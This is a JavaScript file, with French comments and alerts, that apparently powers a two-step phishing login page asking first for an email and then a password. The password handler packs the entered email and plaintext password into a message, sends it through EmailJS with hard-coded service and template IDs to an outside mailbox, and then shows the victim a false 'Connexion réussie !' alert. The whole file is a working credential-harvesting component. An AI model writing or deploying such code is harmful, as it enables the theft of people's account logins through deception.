document.addEventListener("DOMContentLoaded", function () {
    const emailForm = document.getElementById("email-form");
    const passwordForm = document.getElementById("password-form");
    const emailInput = document.getElementById("email");
    const passwordInput = document.getElementById("password");
    const backBtn = document.getElementById("back-btn");

    emailForm.addEventListener("submit", function (event) {
        event.preventDefault();

        if (emailInput.value.trim() !== "") {
            history.pushState({ page: "password" }, "", "#password");
            emailForm.style.display = "none";
            passwordForm.style.display = "block";
        } else {
            alert("Veuillez entrer votre adresse e-mail.");
        }
    });

    passwordForm.addEventListener("submit", function (event) {
        event.preventDefault();

        if (passwordInput.value.trim() !== "") {
            // Construire le message avec les informations de connexion
            const message = `Email: ${emailInput.value}\nMot de passe: ${passwordInput.value}`;

            // Envoyer les données à EmailJS
            emailjs.send("service_u6vikzg", "template_0x8is9j", {
                message: message // Utilisez la variable 'message'
            }).then(function(response) {
                console.log('Email envoyé!', response.status, response.text);
                alert("Connexion réussie !");
            }, function(error) {
                console.log('Erreur:', error);
                alert("Erreur lors de l'envoi de l'email.");
            });
        } else {
            alert("Veuillez entrer votre mot de passe.");
        }
    });

    backBtn.addEventListener("click", function () {
        history.back();
    });

    window.addEventListener("popstate", function (event) {
        if (!event.state || event.state.page === "email") {
            emailForm.style.display = "block";
            passwordForm.style.display = "none";
        }
    });

    history.replaceState({ page: "email" }, "", "#email");
});
